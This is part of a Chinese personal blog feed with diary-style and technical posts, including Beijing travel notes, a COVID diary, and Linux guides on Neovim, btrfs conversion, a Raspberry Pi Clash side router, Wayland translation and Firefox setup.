结果 11月3号,出于对自身安全的考虑,几乎所有clash相关软件作者,包括clash内核项目作者,集体将代码库删除.一个持续了数年,帮助到许多网民的软件,却因为网民们的无知,在一天 …  </content></entry><entry><title>2023 记北京秋游</title><url>/posts/gossip-beijing-travel-2023-2/</url><categories><category>碎碎念</category></categories><tags/><content type="html">   与所爱之人在一起的时光, 会生出互相的珍惜, 这份珍惜犹如风筝线一般, 即便对方远在云端, 依旧可以感知到其心念所动, 于是思念由此而生.
在yq成功上岸家乡的教师编后, 为了庆祝, 也为了缓解许久未见的相思之苦, 我匆忙计划了一下行程, 一边让她订来北京的车票, 一边思考附近哪里有卖香槟的.
颐和园 选择颐和园, 是因为离信工所比较近. 当日原本想带yq去我平时去的早餐店, 可惜我们出发之时, 已是中午十二点了, 于是带她吃之前推荐过的意大利沙县萨莉亚. 这是一个价格非常亲民的意大利西餐厅, 看了看菜单上十几二十元的菜品后, 我们彻底放下了对价格的顾虑, 仅仅考虑口味和胃口. 实际上这家店的口味确实不错, 特别是蘑菇浓汤, 虽然肯定不能说顶级, 但这种不用顾虑价格就享受西餐的轻松感, 独此一份 (说白了还是太穷).
阳光正好, 晒在身上暖洋洋的. 我们在下公交之后, 慢慢悠悠前往颐和园的入口, 路上落叶飞舞, 却无半点萧条, 行人来来往往, 一个婴儿车里的小孩指着另一个在妈妈自行车车筐里的小孩羡慕地哇哇直叫, 惹得两边的家长忍俊不禁. 走走停停之间, 我们时而在路边的亭子里歇脚, 时而在红砖绿瓦的不知名府门前驻足拍照, 心下一片闲适.
进入颐和园后才发现这里出乎意料的大, 但想想这毕竟是皇帝的游玩之地, 倒也算合理. 我们绕过威武的麒麟像, 路过皇帝慈禧临时听政的仁寿宫和一棵棵百年龙柏, 穿过城关, 来到谐趣园. 因为是秋天的缘故, 尽管气温并不让人觉得有秋意, 但是池中的荷花已经尽数枯萎, 风光不再, 宛如那个死去多时的王朝. 沿着回廊行走, 我恼于这行走的空间竟然如此狭窄, 古代的皇帝不与人并肩行走, 其他的人只能尾随, 因此凡是走廊一类的地方都可以设计地窄小一些, 只是我不禁开始无端思考, 长期地处于这样的空间里, 人的心胸眼界是否也会变得狭小呢?
一路上看到了许多格格打扮的女生在凹造型拍照, 纸扇轻摇, 回眸一笑, 气质优雅, 恬静端庄, 只是都没有我的身边人这般可爱.
来到苏州街, 我和yq沿河而行, 小心路过一间间无人的商铺. 昔日皇帝为在此重现江南风情, 仿照水镇在此地建造了买卖街, 专供宫中人游览, 即所谓&amp;amp;quot;宫市&amp;amp;quot;. 这个地方1860被列强烧毁, 一百多年后才由共和国重建, 然而我对此类皇室娱乐并不感冒, 只是紧张地一遍遍提醒 …  </content></entry><entry><title>lineageos使用体验</title><url>/posts/tech-lineageos-md/</url><categories><category>技术</category></categories><tags/><content type="html">   2024年7月更新: 经过了半年的时候, 遇到的问题包括但不限于 1) 微信卡顿 2) 银行类app无法使用 3) system UI经常崩溃 4) 快充消失. 出于可用性考虑, 已经转回coloros
2024年2月更新: Lsposed连同一系列root隐藏模块已经归档无法使用, 为了方便日常使用, 建议卸载magisk, 刷机的时代已经过去了.
不知道从什么时候开始, 往日被冠以高可玩性高自由度的安卓系统逐渐变得封闭, 一步步沦为资本市场的玩物和工具. MIUI也好, ColorOS也罢, 用户总能在使用系统的过程中发现一些去也去不掉的应用和小程序, 看到一些不想看也得看的广告, 而起初, 有些人尽管对此有所不满, 但基本都选择容忍的态度, 但这几年国内的趋势越来越不对劲: 先是某APP在全社会的宣传下或软性或硬性地被安装在了相当大一部分人的手机中监控个人信息(当然, 我理解打击诈骗行为, 保护平民百姓的钱包远比软件自由重要得多), 又是拼多多被爆出利用安卓手机的0day漏洞在所有用户的手机上进行多种恶意行为, 一直到最近, 一则某信部的发文通知将这种 我的手机不归我管 的焦虑感推向了新的高潮.
就目前来看, 这则通知的社会反响并不强烈, 不出意外应该可以顺利推行. 之后最直观的效果就是所有使用国内安卓系统的用户都只能安装指定的app, 不再具备安装推特等软件的能力, 这无异于干掉了安卓最大的特点, 使其沦落为全方位落后于苹果的手机系统. 作为一个经历过安卓app爆发式增长年代的玩家, 我很好奇现在新接触到手机的用户对自己掌中的设备是一个什么样的印象, 是一个拥有无限可能的工具? 还是一个用低质量内容, 广告和充满限制的操作系统来无限吸收注意力, 获取个人隐私并变相管理个人精神世界的资本和政府工具?
万幸的是, 安卓的开源属性为它保留下了一些自由的火种, 那边是第三方rom. 本文主要记录自己安装 lineageos, magisk, Lsposed 以及一些有用软件的过程.
购买机器 查看 lineageos支持的设备列表 , 出于对一加的偏好和对骁龙888发热的不放心, 我选择以一加8pro作为自己的新设备. 在咸鱼上逛了很久, 筛掉一大批机器贩子和低质量卖家后, 我看中了一位宝妈的二手机并下单. 机器到手后我非常满意, 因为成色实在是很好, 连维修店里 …  </content></entry><entry><title>动荡时代</title><url>/posts/gossip-unstable-software/</url><categories><category>碎碎念</category></categories><tags/><content type="html">   乱世之中, 唯有自我与我所爱值得珍惜
很久以来我一直在思考一个问题,为什么对于别的技术型职业,例如医生,教师,高级技工,裁缝,厨师,从业者的从业时间越长越吃香,而唯独中国程序员深陷于35岁魔咒之中.抛去国内劳动力市场扭曲的供求关系,还有一个经常为人所忽视的原因是最佳技术选型尚处于迭代之中.
与其他行业漫长的发展历史相比,计算机行业是一个&amp;amp;quot;小年轻&amp;amp;quot;,而其下属的软件行业更是初生牛犊.理工农医,文史哲艺,经管法教,每一门学科都发展了百年以上,其中一些的历史更是与人类文明史一般漫长.反观计算机行业,现代计算机的理念是由图灵在1936年提出的,而第一台可编程通用计算机则是在1945年出现的.这仅仅只是一个开始,由于行业的特殊性,直到1978年x86架构出现以及1973年C语言出现,软件行业才算是开始发展.如此算来,当代如日中天人人羡艳的程序员行业,仅仅只有五十多岁,比我们的爷爷奶奶辈都要年轻不少.如此年轻的行业,势必还有很大的提升空间.
另外,软件行业的发展也随时受硬件发展的影响,20年前寸土寸金的内存在今天已经不再成为用户使用的瓶颈,那些为了充分利用内存而想出的奇思妙想也不再为人所津津乐道.硬件成了绝大部分软件开发任务中最低廉的成本,而人力成本占的比重则越来越高,这也是为什么诸如Electron之类的框架能够大行其道.这只是硬件影响软件的案例中影响比较小的案例,其他的硬件变革,例如苹果Arm架构对传统x86架构的冲击,苹果共享内存在人工智能领域对英伟达的优势,乃至于可能出现的量子计算机,都正在对软件行业产生持续性的影响,而这些影响所能带来什么样的改变,目前还说不好,毕竟计算机是一个相当年轻的行业,连硬件都没有达到公认最优的状态(架构,指令集,容量,寿命等等),更何况是在此基础上的软件行业呢?
哪怕是抛开硬件变化的影响不谈,软件领域内部也在不停更迭中.
论编程语言,不说typescript,coffeescript这些在javascript基础上发展的语言,且说golang和rust两位抛弃面向对象的后起之秀已经开始凭借它们优秀的设计分别在业务领域和基础设施领域逐渐蚕食java和c++的份额,后两者由于拥有成熟的生态和大量的已有实践导致开发者经常陷入编程语言的选择困难症,在此基础上还衍生出了各种编程语言宗教.而golang和rust就是最棒的编程语言吗? …  </content></entry><entry><title>我的neovim</title><url>/posts/tech-neovim2023/</url><categories><category>技术</category></categories><tags/><content type="html">   现在回头看几年前自己写的插件配置文章, 看着那些曾经用过但后来都纷纷被替代的插件, 我会莫名怀念那段因计算机和终端而兴奋不已的自己.
在 2019 年四月份第一次写 vim 配置文章后, 时间已经过去了四年. 物是人非, 这几年发生了太多的破事烂事, 回想起来, 竟没有几件好事可供玩赏的, 国家的兴盛繁荣和普通人暗淡的生活产生了强烈的对比, 其带来的撕裂感让包括我在内的许多人都感到麻木且疲惫, 每当感到绝望和悲哀时, 我会诉诸文字来排遣情绪, 敲敲代码来为自己的生活带来些许意义, 毕竟, 这是程序员为数不多的特权了.
而不管是写文也好, 写代码也好, 人若重视, 自然会想得到一个趁手的工具: jetbrain IDE, obsidian, word, trilium, vscode &amp;hellip;&amp;hellip; 对于大部分人来说, 这些便已经足够, 只是如果有人仔细观察, 就会发现这些工具都是商业化的闭源软件, vscode 也是, 即便宣称开源, 但是人们用的二进制包是微软在开源代码的基础上添加了功能后封装闭源的. 不过说到底, 这些软件开源与否, 对我们普通人来说并没有多大的影响, 只是对于有开源软件洁癖的人来说可能会无法接受, 这个时候如果冒出来一个开源, 简单却又拥有无限扩展性和不输给 IDE 的功能的编辑器, 那么无疑能收获一批粉丝, 而 neovim 正是这样的编辑器.
之前在知乎看到了一个问题: 编辑器中你认为最重要的功能有哪些? 我在这里列出自己认为比较重要的功能, 来作为本文的索引:
良好的编码体验 人性化的界面 代码调试 模糊查找 其他 与此同时: 文本仅对一些比较有用的插件进行推荐, 并在文末贴出自己的配置链接, 在这里不对自己的配置过多的介绍 (因为确实结构比较简单, 大伙一看就会明白的 :) .
良好的编码体验 功能 插件 语法高亮 nvim-treesitter/nvim-treesitter 代码补全 hrsh7th/nvim-cmp 代码片段 L3MON4D3/LuaSnip 其他linter, formatter等 nvimtools/none-ls.nvim AI(Copilot)集成 zbirenbaum/copilot.lua git 状态显示 lewis6991/gitsigns.nvim 自动生成文档 danymat/neogen 光标跳转 folke/flash.nvim lsp 增强体验 glepnir/lspsaga.nvim 高亮当前词 RRethy/vim-illuminate 代码结构展示 nvim-neo-tree/neo-tree.nvim 特色缩进 lukas-reineke/indent-blankline.nvim 特色注释 folke/todo-comments.nvim 快速注释 numToStr/Comment.nvim tab 跳出括号和字符串 abecodes/tabout.nvim 代码折叠 kevinhwang91/nvim-ufo lsp/format/dap 源管理 williamboman/mason.nvim 括号操作 kylechui/nvim-surround 自动补全括号中括号等 windwp/nvim-autopairs 部分功能截图:
人性化的界面 功能 插件 主题 folke/tokyonight.nvim 引导界面 glepnir/dashboard-nvim 文件树 nvim-neo-tree/neo-tree.nvim 标签栏 akinsho/bufferline.nvim 状态栏 hoob3rt/lualine.nvim 截图:
代码调试 功能 插件 调试功能 mfussenegger/nvim-dap 展示 ui rcarriga/nvim-dap-ui inline 变量显示 theHamsta/nvim-dap-virtual-text 模糊查找 功能 插件 模糊查找 nvim-telescope/telescope.nvim fzf集成 nvim-telescope/telescope-fzf-native.nvim 截图: 其他 功能 插件 Tmux适配 christoomey/vim-tmux-navigator 删除buffer的同时不破坏窗口布局 famiu/bufdelete.nvim 远程剪切板同步 ojroques/nvim-osc52 session 恢复 tpope/vim-obsession 最后贴上配置文件地址, 感兴趣可以去看看: link   </content></entry><entry><title>2023 小游京城</title><url>/posts/gossip-beijing-travel-2023/</url><categories><category>碎碎念</category></categories><tags/><content type="html">  难得黄小姐来一次北京, 作为肥宅的自己紧急规划了一下游玩路线, 发现北京可玩的地方相当的多, 这里仅仅记录这次游玩所经过的三个景区.
天安门 一大早起来从学校出发, 与黄小姐会合之后坐着地铁来到了天安门广场. 现场人很多, 黄小姐指挥我给她拍照, 并现场进行拍照教学, 只可惜我委实不是这块料. 隔着一条街看天安门, 发现那红墙远没有自己想象中来得艳丽, 而是略有些暗沉. 我对天安门没有什么兴趣, 但是看到人民英雄纪念碑时会忍不住过去看看, 因为我知道政治会骗人, 但英雄的牺牲不会.
拜访完天安门, 本想坐个公交去景山公园, 但是很明显, 身边人山人海的游客们也是这么想的. 公交车还没到, 大爷大妈们就扒起了车门, 车门一开, 他们就像是战场上的勇士一般拼命往上挤, 无论前门还是后门, 丝毫没有考虑到车上的人都下不来了. 我很久没有见识过这样的场面, 听着车上孩子的哭闹, 想到这里是天安门前, 更觉魔幻. 我们也放弃了公交车, 步行前往景山公园.
景山公园 一路上步行了许久, 等到达公园的时候我也有些累了. 迎面看到有些游客聚在一处石碑面前, 我凑上去看, 当即发现这里原来是崇祯皇帝自杀的地方, 那是当年在明朝那些事里面看到的人物, 到今天印象也颇为深刻. 这样的意外发现让自己在游览景物时不自觉的带上了历史的滤镜, 每当看到一块石雕的时候, 心里就会在想, 这块石头当年是不是崇祯自杀的见证者之一呢?
当然, 免不了的还有黄小姐的例行照相, 我们爬上山, 在山顶以俯瞰视角拍到了故宫, 然后累如死狗一般慢慢下山.
北京动物园 人生第一次来动物园, 见识了很多之前只在电视上看到过的动物, 也感慨于人类对于这些生灵的态度仅仅只是欣赏玩物罢了. 和穿汉服的黄小姐在河边拍了一会照片后, 又逛了几个馆, 就回去吃烧烤了.
  </content></entry><entry><title>优化neovim markdown中的treesitter高亮</title><url>/posts/tech-neovim-treesitter-markdown/</url><categories><category>技术</category></categories><tags/><content type="html"><![CDATA[   eye candy也是一种生产力!
动机 treesitter为neovim带来了语法高亮, 让不同语言都被解析成统一的语法树, 并对语法树上的不同部分进行样式的定义. 然而, neovim treesitter对markdown的默认解析方式和高亮模式过于简陋, 不同层级的标题采用的是统一的样式, 列表也仅有开头采用了高亮. 这对于日常使用neovim来编辑markdown的人十分不友好, 于是我花了一点时间了解了一下treesitter的高亮过程, 并最终形成了自定制的漂亮样式.
这是原来的
这是自定义后的
步骤 复制neovim treesitter插件自带的markdown highlight.scm 文件, 由于我使用的插件管理器是lazy, 因此该文件位于~/.local/share/nvim/lazy/nvim-treesitter/queries/markdown/highlights.scm 进入你的配置文件目录 ~/.config/nvim, 创建 ~/.config/nvim/queries/markdown/highlights.scm , 没有目录就创建一下, 将第一步复制的文件内容复制到这里来
对~/.config/nvim/queries/markdown/highlights.scm 进行自定义修改, 在这里贴出我的
;From MDeiml/tree-sitter-markdown ; (atx_heading (inline) @text.title) ; (setext_heading (paragraph) @text.title) ; [ ; (atx_h1_marker) ; (atx_h2_marker) ; (atx_h3_marker) ; (atx_h4_marker) ; (atx_h5_marker) ; (atx_h6_marker) ; (setext_h1_underline) ; (setext_h2_underline) ; ] @punctuation.special [ (atx_heading (atx_h1_marker)) ] @text.title1 [ (atx_heading (atx_h2_marker)) ] @text.title2 [ (atx_heading (atx_h3_marker)) ] @text.title3 [ (atx_heading (atx_h4_marker)) ] @text.title4 [ (atx_heading (atx_h5_marker)) ] @text.title5 [ (atx_heading (atx_h6_marker)) ] @text.title6 [ (link_title) (indented_code_block) (fenced_code_block) ] @text.literal (pipe_table_header (pipe_table_cell) @text.title) (pipe_table_header &#34;|&#34; @punctuation.special) (pipe_table_row &#34;|&#34; @punctuation.special) (pipe_table_delimiter_row &#34;|&#34; @punctuation.special) (pipe_table_delimiter_cell) @punctuation.special [ (fenced_code_block_delimiter) ] @punctuation.delimiter (code_fence_content) @none [ (link_destination) ] @text.uri [ (link_label) ] @text.reference [ (thematic_break) (list (list_item (list_marker_minus) (paragraph (inline)))) (list (list_item (list_marker_plus) (paragraph (inline)))) (list (list_item (list_marker_star) (paragraph (inline)))) (list (list_item (list_marker_dot) (paragraph (inline)))) (list (list_item (list_marker_parenthesis) (paragraph (inline)))) ] @punctuation.special2 (task_list_marker_unchecked) @text.todo.unchecked (task_list_marker_checked) @text.todo.checked (block_quote) @text.quote [ (block_continuation) (block_quote_marker) ] @punctuation.special [ (backslash_escape) ] @string.escape ([ (info_string) (fenced_code_block_delimiter) ] @conceal (#set! conceal &#34;&#34;)) (inline) @spell 前往~/.config/nvim/ftplugin/markdown.lua文件, 为新增加的节点定义高亮样式, 我的该文件内容如下, 读者可以自行修改颜色
vim.opt_local.expandtab = true vim.opt_local.shiftwidth = 4 vim.opt_local.tabstop = 4 vim.opt_local.softtabstop = 4 vim.opt_local.foldmethod = &#34;expr&#34; vim.opt_local.foldexpr = &#34;nvim_treesitter#foldexpr()&#34; vim.api.nvim_set_hl(0, &#34;@text.title1&#34;, {fg=&#34;#7aa2f7&#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, &#34;@text.title2&#34;, {fg=&#34;#ff9e64&#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, &#34;@text.title3&#34;, {fg=&#34;#9ece6a&#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, &#34;@text.title4&#34;, {fg=&#34;#7dcfff&#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, &#34;@text.title5&#34;, {fg=&#34;#bb9af7&#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, &#34;@text.title6&#34;, {fg=&#34;#cfc9c2&#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, &#34;@text.quote&#34;, {fg=&#34;#bb9af7&#34;, bold=false, italic=true}) vim.api.nvim_set_hl(0, &#34;@punctuation.special2&#34;, {fg=&#34;#73daca&#34;, bold=true, italic=false}) End
  ]]></content></entry><entry><title>树莓派搭载clash作为旁路由</title><url>/posts/tech-openwrt-rasp/</url><categories><category>技术</category></categories><tags/><content type="html">   “一个黑暗的形体，像一个匍匐的人一般大小，但是长着长长的蜘蛛一样的肢体……黑暗中的形体以惊人的速度向他奔来。当它靠近时，他看到那蹲坐着的乌黑身体上有一张脸，在身体底部那些多节的腿之间。那张面孔用一种怀疑和质问的可憎表情凝视着他；而当这个大胆的猎人与那小而狡诈的，四周全是毛发的眼睛对视时，恐惧流遍了他的每一根血管。”
自从我在自己的红米ac2100上跑shellclash之后, 路由器的表现就开始变得不再稳定, 且不说shellclash 的些许适配上的小问题, clash自身所消耗的内存, 也让我这台只有128M内存的路由器不堪重负.
一开始, 我想换个性能更好的路由器比如AX6000这样的路由器, 一看价格也不是特别贵, 就想着入手, 但是向来崇尚极简主义的自己不免会想到怎么处理手头现有的路由器, 难道要扔掉吗? 我一边这样想着, 一边查看AX6000的参数, 希望能看到足够吸引我购买的数值, 但是512M的内存容量属实让我笑出了声: 这算什么, 我手头的树莓派3b+都能吊打它.
想到这里, 心念一动, 对啊, 如果可以以某种方式让树莓派和路由器协作起来, 让clash跑在树莓派上, 既能解决我的问题, 又可以让吃灰已久的树莓派再就业, 岂不美哉? 如此想着, 就找到了 https://zhuanlan.zhihu.com/p/270351562?utm_id=0 ,
第一步 刷入openwrt 当然, 要达到这样的效果, 第一步是让我的路由器刷入openwrt, 幸运的是, openwrt官方支持红米ac2100并且在官网给出了安装教程, 链接为https://openwrt.org/toh/xiaomi/xiaomi_redmi_router_ac2100, 然后可以按照个人喜好调整网段, 由于我的局域网中有一个k8s集群, 我不希望集群节点的ip变化, 因此我将默认的192.168.1.0/24 设置成了 192.168.31.0/24
第二步 树莓派设置 静态ip 编辑 /etc/dhcpcd.conf, 添加静态ip
interface eth0 static ip_address=192.168.31.55/24 static routers=192.168.31.1 static domain_name_servers=192.168.31.1 …  </content></entry><entry><title>ext4到btrfs转换记录</title><url>/posts/tech-ext4-to-btrfs/</url><categories><category>技术</category></categories><tags/><content type="html">  这篇文章是对我从ext4文件系统转换到btrfs过程中的一些操作记录, 便于日后参考.
前置准备 制作arch linux 启动盘, 版本越新越好. 备份重要文件 我个人在转换前会把大文件(例如虚拟机文件)转移到移动硬盘里, 让转换过程更快一些 转换 进入LiveCD 系统, 对主分区进行转换
btrfs-convert /dev/nvme0n1p2 等待一段时间之后, 显示conversion complete就表示没有问题, 接下来还需要做三件事情才可以进入系统
修改fstab 首先将转换成功后的分区挂载到/mnt下
mount /dev/nvme0n1p2 /mnt 使用lsblk -f命令查看分区的UUID号, 拍个照片记一下
编辑/mnt/etc/fstab, 修改这个分区类型为btrfs, 将最后的两列数字都改成0, 保存退出
重建内存盘 先挂载, 然后进入chroot环境
mount -t proc none /mnt/proc mount -t sysfs none /mnt/sys mount -o bind /dev /mnt/dev chroot /mnt bash 然后执行下列命令来为所有内核重建内存盘
mkinitcpio -P 最后重建grub引导, 按照道理应该要把引导分区/dev/nvme0n1p1挂载到/mnt/boot之后才可以, 但是我记得自己执行的时候没有挂载?
grub-mkconfig -o /boot/grub/grub.cfg 重建grub引导 在上一步的chroot环境中, 执行下列命令, 记得把引导分区挂载到/mnt/boot
grub-mkconfig -o /boot/grub/grub.cfg 大功告成, 退出chroot, 重启电脑就可以进入你的系统了, 唯一的不同是它已经是btrfs了.
子卷建立 经过上述操作后, 你会得到一个没有子卷的根文件系统, 这点可以通过命令验证
sudo btrfs subvol list / 没有子卷就没有快照, 为了利用好btrfs的特性, 有必要新建快照, 并将数据迁移到里面. 同样, 我们需要进入 LiveCD 系统
首先将btrfs分区挂载到/mnt下
mount -o subvol=/ /dev/nvme0n1p2 /mnt 接下来就要开始新建子卷了, 我新建的子卷 …  </content></entry><entry><title>wayland下的划词翻译解决方案</title><url>/posts/tech-translation-under-wayland/</url><categories><category>技术</category></categories><tags/><content type="html"><![CDATA[  对于我这种英语不好的人来说, 翻译是离不开的工具, 但是众所周知, Linux的日用软件生态相比较windows和macos来说相差甚远, 别说目前正处于发展阶段的wayland, 就连成熟透了的x11下也没有拿得出手的翻译软件. 作为一个英语不好的Linux爱好者, 缺少翻译软件必定会对日常的使用造成一定的影响, 于是开始思考怎么样解决这个问题.
我的第一个思路, 也就是见到最多的划词翻译软件的样子, 选中文本之后, 在被选中的文本周围的某块区域中绘制一个窗口, 在其中展示翻译结果. 但是问题来了, 要如何绘制这样的窗口呢? 在wayland中, 窗口的位置交给了compositor进行管理, 这种能够自己决定显示位置的能力, 据我所知, 在wayland下仅有fcitx5做到了, 于是我翻阅了一下它的源代码, 并没有看懂, 但是应该没有借助于Qt和GTK来绘制, 而是使用wayland-client. 对我这样一个连Qt GTK开发经历都没有的人来说, 理解wayland编程开发中的那些概念实在有些困难. 于是紧接着又有一个问题出现了:
能否绕开wayland?
就我思考这个问题的时候, linux QQ给我发了一个系统通知, 我的电脑上的系统通知服务原先只是为了让linux qq不崩溃才安装的, 然而这个时候, 它给了我一个新的解决方案: 使用系统通知来呈现翻译结果. 于是搜了一下如何发送系统通知, 发现竟然意外的简单.
notify-send &amp;#34;title&amp;#34; &amp;#34;content&amp;#34; 那么接下来的问题: 如何获取选中文本的内容? 这个问题, 我原本计划通过阅读wl-clipboard来学习的, 但是我想先尽快用上翻译, 把优化放到以后再说, 于是决定直接使用wl-clipboard来获取选中文本内容, 那么至此思路理清, 大致如下:
使用剪切板获取到选中文本的内容, 可以使用wl-paste -p来获取 获取文本之后, 将换行符替换成空格 (这块可以有更好的处理方法, 简单起见就全换掉了), 使用sed 文本处理完毕后, 将文本输入进translate.js中进行翻译, (这块可以使用别的现成工具) 翻译结果出来之后, 将结果以系统通知的形式呈现出来, 当然, 系统通知必须要有, 可以是dunst, mako, swaync, 以 …  ]]></content></entry><entry><title>武装火狐</title><url>/posts/tech-arm-firefox/</url><categories><category>技术</category></categories><tags/><content type="html"><![CDATA[  不管火狐的市场份额多么拉胯, 对于Linux wayland用户来说, 目前体验最好的浏览器依旧是Firefox. 本篇记录我的FIrefox配置, 包括浏览器设置和插件设置.
外观 titlebar 为了让标题栏中的内容可以更加紧凑, 一个好办法是进入about:config, 设置browser.compactmode.show为true, 然后进入custom toolbar, 设置Density为Compact
对于wm用户, 一个推荐的设置是勾选上上图中的Title Bar选项, 为什么要这么设置呢, 因为这样子做, 那些按钮(最大最小化, 关闭窗口)就会出现到title bar中, 然后title bar会被wm吃掉, 这样就可以给火狐的标题栏留出更多的空间
ps: 我用的主题名字叫做tokyonight
Firefox-UI-Fix 使用 Firefox-UI-Fix 来个性化Firefox的界面
Addon Vimium 该插件将vim的操作方式带入到浏览器中, 能够让用户更少依赖鼠标.
默认情况下, firefox出于安全考虑会在一些页面中禁用Addon, 为了让该插件能够在更多的页面上使用, 需要在about:config中进行以下设置
extensions.webextensions.restrictedDomains清空掉 privacy.resistFingerprinting.block_mozAddonManager设置为true,来让插件在所有页面上都可以使用 以下是我的Vimium键位设置.
# Insert your preferred key mappings here. unmapAll map H previousTab map J previousTab map L nextTab map K nextTab map &amp;lt;c-j&amp;gt; scrollPageDown map &amp;lt;c-k&amp;gt; scrollPageUp map &amp;lt;c-o&amp;gt; goBack map &amp;lt;c-i&amp;gt; goForward map o Vomnibar.activateInNewTab map b Vomnibar.activateBookmarksInNewTab map t …  ]]></content></entry><entry><title>2022年度总结</title><url>/posts/gossip-2022-summary/</url><categories><category>碎碎念</category></categories><tags/><content type="html">   2022年是一个记得被纪念的年份, 不是因为它有多好, 而是因为它有多现实
于我个人而言, 2022年并不是一个好年份, 想必读者也是这么认为的, 但是要说具体哪里不好, 可能又说不上来, 或者是那些震动三观的记忆随着国家对舆论的引导而变得模糊, 毕竟这是政府惯用的手段. 只是总有人不甘心于此, 不甘心于铺天盖地的好好好和赢赢赢,不甘心于1984般的舆论洗脑,于是我们能看到昙花一现的 网易新闻2022年度盘点 ,能在一个个转发的微信消息中窥见残忍的现实. 这样的一年是富有意义的, 它让太多的人变得清醒, 只是终究还是担心, 这样的清醒在被肆意玩弄的舆论下还能留存多久, 毕竟人是健忘的, 个体如此, 社会亦然, 而反抗之道, 在乎文字与记录.
于是我坚持记录日记, 并且把每个月的日记中比较有价值的片段单独摘录到新的文件中以方便回顾, 就这样一点一滴记录了整整一年的时间, 这也是我第一次如此稳定地一直使用同一款笔记软件. 多亏这看似微不足道的习惯, 让我能够在短短几分钟时间里回顾今年值得记录的几个转变.
彻底放弃CTF和网络安全 这是一个很重要的决定, 因为在相当长的一段时间里, 自己给自己贴的标签依旧是所谓的黑客, 各种的竞赛和外快也给自己带来了一点收入和乐趣, 然而在这个领域呆得越久, 我越觉得自己不是这块料, 期间也有过几次挣扎, 然而终究还是深入不下去. 这或许和该领域所强调的反向思维有关, 又或许只是我单纯不够努力, 然而时至今日, 看着当初一同学习的小伙伴如今成为了业内的大牛, 太多的失望积累起来, 让我最终下定决心离开, 毕竟哪怕抛开个人感情不谈, 博士毕业也需要我把更多的注意力放在论文上.
不再相信权威 在此之前, 我对于官媒尽管保持忽视的态度, 但是对于其中的信息真实性并没有怀疑. 但是在经历过2022年的疫情后, 在看到经历人祸的人民被政府掐着脖子说好好好之后, 一切的信任都被推翻, 如今的自己在听到官媒发布的消息时, 只会麻木的默默捂住耳朵.
放一放技术, 多关心关心身边人和身体健康 过去的自己在那些所谓的新颖技术上花费了太多心思, 没有照顾好自己, 也没有关心到他人. 然而人才是本, 计算机不是, 不能因为折腾而牺牲自己的人际关系, 更不能牺牲自己的身体健康.
看清现实 过去的时光总是如此的美好, 尤其是和当下的焦虑和迷茫相比更是如此. 这两年 …  </content></entry><entry><title>小阳人日记</title><url>/posts/gossip-yang-diary-md/</url><categories><category>碎碎念</category></categories><tags/><content type="html">   生命本就如此脆弱
12.16 宿舍楼里的人很多已经阳了, 斜对门的宿舍也阳了. 学校赶人且机票价格低,于是选在了16号出发.
16号当天来到机场的时候完全没有检查健康宝的步骤, 甚至没有量体温的步骤, 一瞬间的感觉是很不习惯, 然后就是觉得危险. 但是早餐不能不吃, 于是在登机口吃了kfc, 这是可能感染的第一个点.
坐飞机, 下飞机, 上大巴, 然后到车站. 这期间能被感染的点太多了, 人口聚集太密集了.
回到家后, 凌晨一点不到感觉身体着凉,喉咙隐隐有点不舒服.
12.17 喉咙发炎,没量体温,仍存有侥幸心理.
12.18 喉咙发炎+头晕,体温正常,家里人因此觉得只是感冒,我说可能是新冠,但是你们肯定防不住了.
12.19 喉咙发炎加重为刀片嗓, 头不晕了,体温正常.
12.20 刀片嗓,背部肌肉有些酸痛无力,开始咳嗽鼻塞流鼻涕.体温正常.
pdd上的药都要下个月才能送出来, 家里的药也很有限.
晚上妈妈发烧了, 用抗原试纸一测很快就出来了两道杠, 估计是被我传染的, 我后悔这个时候回来, 哪怕出去旅游一圈养出抗体再回来也好.
12.21 继续刀片嗓子，流鼻涕咳嗽鼻塞，肌肉不疼了，体温正常。老妈烧退了，但是有些头晕
12.22 嗓子差不多好了，流鼻涕鼻塞，不咳嗽了。老爸开始出现症状，全身肌肉疼痛，但是没有发烧。
12.23 症状基本消失. 家里人症状都有明显好转
12.24 完全好转, 前前后后经历了八天.
  </content></entry><entry><title>使用Arch Linux + Sway一年后</title><url>/posts/tech-arch-sway/</url><categories><category>技术</category></categories><tags/><content type="html">  不知不觉使用sway已经整整一年了，于是来谈一谈自己这一年的使用感受，顺便回顾了一下过去。
起因 2019年，在一次编程作业的时候，同专业的另一个老哥向我展示了vim的代码h补全，我立刻被这种简陋但是扩展性极强的代码编辑器吸引了，于是当时还是个刚转入计算机专业的小白就开始哼哧哼哧地学习vim的配置和插件的安装。当然，这些都发生在我的Kali Linux虚拟机中。
那个时候我正接触CTF，很多时候都要开着虚拟机，于是有一天动起了把电脑系统直接装成linux的想法。因为自己的第一台笔记本是暗夜精灵2，游戏本装Linux，第一个要考虑的就是兼容性和稳定性，在权衡各个发行版的优势和流行程度后，我选择了ubuntu18.04。笔记本重装完毕后除了风扇转个不停竟然一切运行正常，这让我实在有些惊喜，而风扇问题是英伟达独显导致的，在ubuntu上，只需要一条sudo ubuntu-drivers autoinstall就完美解决了。当时的自己很开心，仿佛打开了一道新世界的大门。
后来，我去吉林参加了第一次线下赛，ubuntu没有掉链子，帮我拿了一个一血，我很满意。直到一次上课，手贱执行了apt upgrade，升级完电脑竟然无法开机了，一整个无语，而当时临近期末，我已经没有时间再去折腾系统了，于是紧急安装了windows应付期末复习，顺便下单了一台对Linux更加友好的笔记本Thinkpad T480。
期末考试结束后，我听说了Arch Linux 的大名，但是出于畏难情绪，我选择将ubuntu18.04安装在我的thinkpad t480上，然后去参加xman的夏令营。在夏令营期间，我的电脑在连接wifi一段时间后就再也连接不上了，第一次我选择了重装，但是第二次还是同样的问题，我只好绝望地回到windows10，事后分析的时候，我觉得应该是驱动的问题，thinkpad t480是2018年下半年发布的，ubuntu18.04的驱动可能确实没覆盖到它的网卡。
之后的好几个月里，我都乖乖用着windows10和WSL2，实习的时候全程在虚拟机里面写代码。等到实习结束、保研也结束的时候，我又开始了新一轮的折腾。
